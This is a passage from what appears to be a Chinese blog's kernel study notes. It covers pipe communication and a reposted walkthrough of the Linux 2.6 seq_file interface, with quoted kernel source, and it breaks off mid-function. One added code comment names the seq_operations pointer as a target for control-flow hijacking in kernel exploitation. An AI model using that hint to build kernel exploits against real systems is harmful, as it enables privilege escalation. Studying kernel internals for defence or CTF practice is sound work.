</p><ol><li>父进程调用pipe函数创建管道，得到两个文件描述符fd[0]、fd[1]指向管道的读端和写端。</li><li>父进程调用fork创建子进程，那么子进程也有两个文件描述符指向同一管道。</li><li>父进程关闭管道读端，子进程关闭管道写端。父进程可以向管道中写入数据，子进程将管道中的数据读出。由于管道是利用环形队列实现的，数据从写端流入管道，从读端流出，这样就实现了进程间通信。</li></ol><h1 id="seq-operation结构体"><a href="#seq-operation结构体" class="headerlink" title="seq_operation结构体"></a>seq_operation结构体</h1><p>本文档的Copyleft归yfydz所有，使用GPL发布，可以自由拷贝，转载，转载时请保持文档的完整性，严禁用于任何商业用途。<br>msn: <a href="mailto:yfydz_no1@hotmail.com">yfydz_no1@hotmail.com</a><br>来源：<a href="http://yfydz.cublog.cn/">http://yfydz.cublog.cn</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在fs&#x2F;seq_file.c中定义了关于seq操作的一系列顺序读取的函数，这些函数最早是在2001年就引入了，但以前内核中一直用得不多，而到了2.6内核后，许多&#x2F;proc的只读文件中大量使用了seq函数处理。</p><p>以下内核源码版本为2.6.17.11。</p><h2 id="2-seq相关数据结构"><a href="#2-seq相关数据结构" class="headerlink" title="2.seq相关数据结构"></a>2.seq相关数据结构</h2><h3 id="2-1-seq文件结构"><a href="#2-1-seq文件结构" class="headerlink" title="2.1 seq文件结构"></a>2.1 seq文件结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line"> <span class="type">char</span> *buf;</span><br><span class="line"> <span class="type">size_t</span> size;</span><br><span class="line"> <span class="type">size_t</span> from;</span><br><span class="line"> <span class="type">size_t</span> count;</span><br><span class="line"> <span class="type">loff_t</span> index;</span><br><span class="line"> <span class="type">loff_t</span> version;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span>   <span class="comment">//主要的利用点，可以打控制流劫持</span></span><br><span class="line"> <span class="type">void</span> *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>struct seq_file描述了seq处理的缓冲区及处理方法，buf是动态分配的，大小不小于PAGE_SIZE，通常这个结构是通过struct file结构中的private_data来指向的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *buf：seq流的缓冲区</span><br><span class="line"><span class="type">size_t</span> size：缓冲区大小</span><br><span class="line"><span class="type">size_t</span> from：from指向当前要显示的数据头位置</span><br><span class="line"><span class="type">size_t</span> count：缓冲区中已有的数据长度</span><br><span class="line"><span class="type">loff_t</span> index：数据记录索引值</span><br><span class="line"><span class="type">loff_t</span> version：版本号，是<span class="class"><span class="keyword">struct</span> <span class="title">file</span>的版本号的拷贝</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>：<span class="title">seq</span>锁</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>：<span class="title">seq</span>操作结构，定义数据显示的操作函数</span></span><br><span class="line"><span class="class"><span class="title">void</span> *<span class="title">private</span>：私有数据</span></span><br></pre></td></tr></table></figure><h3 id="2-2-seq操作结构"><a href="#2-2-seq操作结构" class="headerlink" title="2.2 seq操作结构"></a>2.2 seq操作结构</h3><p>seq的操作结构比较简单，就是4个操作函数，完成开始、停止、显示和取下一个操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/linux/seq_file.h */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line"> <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line"> <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line"> <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line"> <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="3-seq操作函数"><a href="#3-seq操作函数" class="headerlink" title="3.seq操作函数"></a>3.seq操作函数</h2><p>seq操作包括以下一系列函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> seq_operations *)</span>;</span><br></pre></td></tr></table></figure><p>打开seq流，为struct file分配struct seq_file结构，并定义seq_file的操作；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br></pre></td></tr></table></figure><p>从seq流中读数据到用户空间，其中循环调用了struct seq_file中的各个函数来读数据；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> (<span class="keyword">struct</span> seq_file *)file-&gt;private_data;</span><br><span class="line"> <span class="type">size_t</span> copied = <span class="number">0</span>;</span><br><span class="line"> <span class="type">loff_t</span> pos;</span><br><span class="line"> <span class="type">size_t</span> n;</span><br><span class="line"> <span class="type">void</span> *p;</span><br><span class="line"> <span class="type">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先加锁</span></span><br><span class="line"> mutex_lock(&amp;m-&gt;lock);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> \* seq_file-&gt;op-&gt;..m_start/m_stop/m_next may do special actions</span></span><br><span class="line"><span class="comment"> \* or optimisations based on the file-&gt;f_version, so we want to</span></span><br><span class="line"><span class="comment"> \* pass the file-&gt;f_version to those methods.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> \* seq_file-&gt;version is just copy of f_version, and seq_file</span></span><br><span class="line"><span class="comment"> \* methods can treat it simply as file version.</span></span><br><span class="line"><span class="comment"> \* It is copied in first and copied out after all operations.</span></span><br><span class="line"><span class="comment"> \* It is convenient to have it as part of structure to avoid the</span></span><br><span class="line"><span class="comment"> \* need of passing another argument to all the seq_file methods.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> m-&gt;version = file-&gt;f_version;</span><br><span class="line"> <span class="comment">/* grab buffer if we didn&#x27;t have one */</span></span><br><span class="line"><span class="comment">// 如果struct seq_file结构中的缓冲区没有分配的话，</span></span><br><span class="line"><span class="comment">// 分配缓冲，大小为PAGE_SIZE</span></span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;buf) &#123;</span><br><span class="line"> m-&gt;buf = kmalloc(m-&gt;size = PAGE_SIZE, GFP_KERNEL);</span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;buf)</span><br><span class="line">  <span class="keyword">goto</span> Enomem;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">/* if not empty - flush it first */</span></span><br><span class="line"><span class="comment">// count表示当时有多少数据还没有传给用户空间</span></span><br><span class="line"><span class="comment">// 尽量先将这些数据传出</span></span><br><span class="line"> <span class="keyword">if</span> (m-&gt;count) &#123;</span><br><span class="line"> n = min(m-&gt;count, size);</span><br><span class="line"> err = copy_to_user(buf, m-&gt;buf + m-&gt;from, n);</span><br><span class="line"> <span class="keyword">if</span> (err)</span><br><span class="line">  <span class="keyword">goto</span> Efault;</span><br><span class="line"> m-&gt;count -= n;</span><br><span class="line"> m-&gt;from += n;</span><br><span class="line"> size -= n;</span><br><span class="line"> buf += n;</span><br><span class="line"> copied += n;</span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;count)</span><br><span class="line">  m-&gt;index++;</span><br><span class="line"> <span class="keyword">if</span> (!size)</span><br><span class="line">  <span class="keyword">goto</span> Done;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// 进行主要传数据过程，缓冲区中至少要有一个记录单位的数据</span></span><br><span class="line"> <span class="comment">/* we need at least one record in buffer */</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 数据记录的位置</span></span><br><span class="line"> pos = m-&gt;index;</span><br><span class="line"><span class="comment">// 初始化操作，返回值为对象相关指针</span></span><br><span class="line"> p = m-&gt;op-&gt;start(m, &amp;pos);</span><br><span class="line"> err = PTR_ERR(p);</span><br><span class="line"> <span class="keyword">if</span> (!p || IS_ERR(p))</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 执行具体的显示过程</span></span><br><span class="line"> err = m-&gt;op-&gt;show(m, p);</span><br><span class="line"> <span class="keyword">if</span> (err)</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 当前缓冲区中的实际数据小于缓冲区大小，转到填数据部分</span></span><br><span class="line"> <span class="keyword">if</span> (m-&gt;count &lt; m-&gt;size)</span><br><span class="line">  <span class="keyword">goto</span> Fill;</span><br><span class="line"><span class="comment">// 否则说明一个记录的数据量太大，原来缓冲区大小不够；</span></span><br><span class="line"><span class="comment">// 先停操作，重新分配缓冲区，大小增加一倍，重新操作,</span></span><br><span class="line"><span class="comment">// 要保证缓冲区大小大于一个数据记录的大小</span></span><br><span class="line"> m-&gt;op-&gt;stop(m, p);</span><br><span class="line"> kfree(m-&gt;buf);</span><br><span class="line"> m-&gt;buf = kmalloc(m-&gt;size &lt;&lt;= <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;buf)</span><br><span class="line">  <span class="keyword">goto</span> Enomem;</span><br><span class="line"> m-&gt;count = <span class="number">0</span>;</span><br><span class="line"> m-&gt;version = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> m-&gt;op-&gt;stop(m, p);</span><br><span class="line"> m-&gt;count = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">goto</span> Done;</span><br><span class="line">Fill:</span><br><span class="line"><span class="comment">// 继续读数据到缓冲区</span></span><br><span class="line"> <span class="comment">/* they want more? let&#x27;s try to get some more */</span></span><br><span class="line"> <span class="keyword">while</span> (m-&gt;count &lt; size) &#123;</span><br><span class="line"> <span class="type">size_t</span> offs = m-&gt;count;</span><br><span class="line"> <span class="type">loff_t</span> next = pos;</span><br><span class="line"> p = m-&gt;op-&gt;next(m, p, &amp;next);</span><br><span class="line"> <span class="keyword">if</span> (!p || IS_ERR(p)) &#123;</span><br><span class="line">  err = PTR_ERR(p);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> err = m-&gt;op-&gt;show(m, p);</span><br><span class="line"> <span class="keyword">if</span> (err || m-&gt;count == m-&gt;size) &#123;</span><br><span class="line">  m-&gt;count = offs;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> pos = next;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// 停seq</span></span><br><span class="line"> m-&gt;op-&gt;stop(m, p);</span><br><span class="line"> n = min(m-&gt;count, size);</span><br><span class="line"><span class="comment">// 将数据拷贝到用户空间</span></span><br><span class="line"> err = copy_to_user(buf, m-&gt;buf, n);</span><br><span class="line"> <span class="keyword">if</span> (err)</span><br><span class="line"> <span class="keyword">goto</span> Efault;</span><br><span class="line"> copied += n;</span><br><span class="line"> m-&gt;count -= n;</span><br><span class="line"> <span class="keyword">if</span> (m-&gt;count)</span><br><span class="line"> m-&gt;from = n;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> pos++;</span><br><span class="line"> m-&gt;index = pos;</span><br><span class="line">Done:</span><br><span class="line"> <span class="keyword">if</span> (!copied)</span><br><span class="line"> copied = err;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> *ppos += copied;</span><br><span class="line"> file-&gt;f_version = m-&gt;version;</span><br><span class="line"> mutex_unlock(&amp;m-&gt;lock);</span><br><span class="line"> <span class="keyword">return</span> copied;</span><br><span class="line">Enomem:</span><br><span class="line"> err = -ENOMEM;</span><br><span class="line"> <span class="keyword">goto</span> Done;</span><br><span class="line">Efault:</span><br><span class="line"> err = -EFAULT;</span><br><span class="line"> <span class="keyword">goto</span> Done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">loff_t</span> <span class="title function_">seq_lseek</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>)</span>;</span><br></pre></td></tr></table></figure><p>定位seq流当前指针偏移；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_release</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br></pre></td></tr></table></figure><p>释放seq流所分配的动态内存空间，即struct seq_file的buf及其本身；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_escape</span><span class="params">(<span class="keyword">struct</span> seq_file *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br></pre></td></tr></table></figure><p>将seq流中需要进行转义的字符转换为8进制数字；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_putc</span><span class="params">(<span class="keyword">struct</span> seq_file *m, <span class="type">char</span> c)</span>;</span><br></pre></td></tr></table></figure><p>向seq流中写一个字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_puts</span><span class="params">(<span class="keyword">struct</span> seq_file *m, <span class="type">const</span> <span class="type">char</span> *s)</span>;</span><br></pre></td></tr></table></figure><p>向seq流中写一个字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_printf</span><span class="params">(<span class="keyword">struct</span> seq_file *, <span class="type">const</span> <span class="type">char</span> *, ...)</span></span><br><span class="line"> __<span class="title function_">attribute__</span> <span class="params">((format (<span class="built_in">printf</span>,<span class="number">2</span>,<span class="number">3</span>)))</span>;</span><br></pre></td></tr></table></figure><p>向seq流方式写格式化信息；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_path</span><span class="params">(<span class="keyword">struct</span> seq_file *, <span class="keyword">struct</span> vfsmount *, <span class="keyword">struct</span> dentry *, <span class="type">char</span> *)</span>;</span><br></pre></td></tr></table></figure><p>在seq流中添加路径信息，路径字符都转换为8进制数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_release_private</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br></pre></td></tr></table></figure><p>释放seq_file的private然后进行seq_release</p><h2 id="3-用seq流填写-proc文件"><a href="#3-用seq流填写-proc文件" class="headerlink" title="3.用seq流填写&#x2F;proc文件"></a>3.用seq流填写&#x2F;proc文件</h2><p>以下使用文件&#x2F;proc&#x2F;net&#x2F;ip_conntrack的生成代码来说明seq流的使用：</p><h3 id="3-1-创立文件"><a href="#3-1-创立文件" class="headerlink" title="3.1 创立文件"></a>3.1 创立文件</h3><p>以前2.4版本中使用proc_net_create()来建立&#x2F;proc&#x2F;net下的文件，现在使用seq流时要使用proc_net_fops_create()函数来创建，区别在于函数的最后一个参数，proc_net_create()的是一个函数指针，而proc_net_fops_create()的是一个文件操作指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc = proc_net_fops_create(<span class="string">&quot;ip_conntrack&quot;</span>, <span class="number">0440</span>, &amp;ct_file_ops);</span><br></pre></td></tr></table></figure><p>proc_net_fops_create()函数其实也很简单，调用create_proc_entry()函数建立&#x2F;proc文件项，然后将文件项的操作结构指针指向所提供的文件操作指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_net_fops_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params"> <span class="type">mode_t</span> mode, <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">res</span> =</span> create_proc_entry(name, mode, proc_net);</span><br><span class="line"> <span class="keyword">if</span> (res)</span><br><span class="line"> res-&gt;proc_fops = fops;</span><br><span class="line"> <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-文件操作结构"><a href="#3-2-文件操作结构" class="headerlink" title="3.2 文件操作结构"></a>3.2 文件操作结构</h3><p>&#x2F;proc&#x2F;net&#x2F;ip_conntrack所用的文件结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ct_file_ops</span> =</span> &#123;</span><br><span class="line"> .owner  = THIS_MODULE,</span><br><span class="line"> .open  = ct_open,</span><br><span class="line"> .read  = seq_read,</span><br><span class="line"> .llseek = seq_lseek,</span><br><span class="line"> .release = seq_release_private,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可见，结构中除了open()函数是需要自定义外，其他的读、定位、释放函数都可以用seq标准函数。</p><h3 id="3-3-open函数定义"><a href="#3-3-open函数定义" class="headerlink" title="3.3 open函数定义"></a>3.3 open函数定义</h3><p>open函数主要就是调用seq_open()函数将一个struct seq_operations结构和struct file链接起来，如果需要有私有数据的话，需要分配出动态空间作为struct seq_file的私有数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ct_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">seq</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ct_iter_state</span> *<span class="title">st</span>;</span></span><br><span class="line"> <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"> st = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ct_iter_state), GFP_KERNEL);</span><br><span class="line"> <span class="keyword">if</span> (st == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"> ret = seq_open(file, &amp;ct_seq_ops);</span><br><span class="line"> <span class="keyword">if</span> (ret)</span><br><span class="line"> <span class="keyword">goto</span> out_free;</span><br><span class="line"> seq     = file-&gt;private_data;</span><br><span class="line"> seq-&gt;private = st;</span><br><span class="line"> <span class="built_in">memset</span>(st, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ct_iter_state));</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">out_free:</span><br><span class="line"> kfree(st);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的如exp_open()函数，就只调用seq_open()函数就完了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">exp_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">return</span> seq_open(file, &amp;exp_seq_ops);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-seq操作结构"><a href="#3-4-seq操作结构" class="headerlink" title="3.4 seq操作结构"></a>3.4 seq操作结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> <span class="title">ct_seq_ops</span> =</span> &#123;</span><br><span class="line"> .start = ct_seq_start,</span><br><span class="line"> .next = ct_seq_next,</span><br><span class="line"> .stop = ct_seq_stop,</span><br><span class="line"> .show = ct_seq_show</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构就是填写4个操作函数：</p><p>start()函数完成读数据前的一些预先操作，通常如加锁，定位数据记录位置等，该函数返回值就是show()函数第二个参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">ct_seq_start</span><span class="params">(<span class="keyword">struct</span> seq_file *seq, <span class="type">loff_t</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line"> read_lock_bh(&amp;ip_conntrack_lock);</span><br><span class="line"> <span class="keyword">return</span> ct_get_idx(seq, *pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stop()函数完成读数据后的一些恢复操作，如解锁等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ct_seq_stop</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span></span><br><span class="line">&#123;</span><br><span class="line"> read_unlock_bh(&amp;ip_conntrack_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>next()函数定位数据下一项：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">ct_seq_next</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line"> (*pos)++;</span><br><span class="line"> <span class="keyword">return</span> ct_get_next(s, v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show()函数实现读数据过程，将要输出的数据直接用seq_printf()函数打印到seq流缓冲区中，由seq_printf()函数输出到用户空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ct_seq_show</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// start()虽然返回的是struct list_head的指针，</span></span><br><span class="line"><span class="comment">// 但struct ip_conntrack_tuple_hash结构的第一</span></span><br><span class="line"><span class="comment">// 项参数就是struct list_head，所以可以进行直接</span></span><br><span class="line"><span class="comment">// 类型转换而不用再计算偏移量</span></span><br><span class="line"> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip_conntrack_tuple_hash</span> *<span class="title">hash</span> =</span> v;</span><br><span class="line"> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip_conntrack</span> *<span class="title">conntrack</span> =</span> 